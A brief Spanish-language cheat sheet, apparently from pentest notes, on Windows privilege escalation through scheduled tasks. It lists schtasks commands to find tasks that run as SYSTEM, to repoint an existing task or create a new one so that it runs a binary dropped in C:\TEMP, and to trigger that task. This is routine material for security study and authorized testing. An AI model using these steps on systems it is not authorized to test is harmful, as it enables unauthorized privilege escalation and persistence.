---
tags: [privesc, windows, schtasks]
---

# Tareas Programadas — Windows

```cmd
schtasks /query
schtasks /query /fo LIST /v | findstr /i "backup.exe"
schtasks /query /fo TABLE /v | findstr /i "backup.exe"

# Tareas que corren como SYSTEM
schtasks /query /fo LIST /v | findstr /i "SYSTEM"
```

## Modificar Tarea Existente

```cmd
schtasks /change /tn "Backup" /tr "cmd.exe /c c:\TEMP\nuevo.exe"
```

## Crear Nueva Tarea

```cmd
schtasks /create /tn "Backup" /tr "cmd.exe /c c:\TEMP\backup.exe" /sc once /st 00:00
```

## Ejecutar Tarea

```cmd
schtasks /run /tn "Backup"
```

> Si aparece una lista gigante de tareas → se pueden crear propias tareas propias.

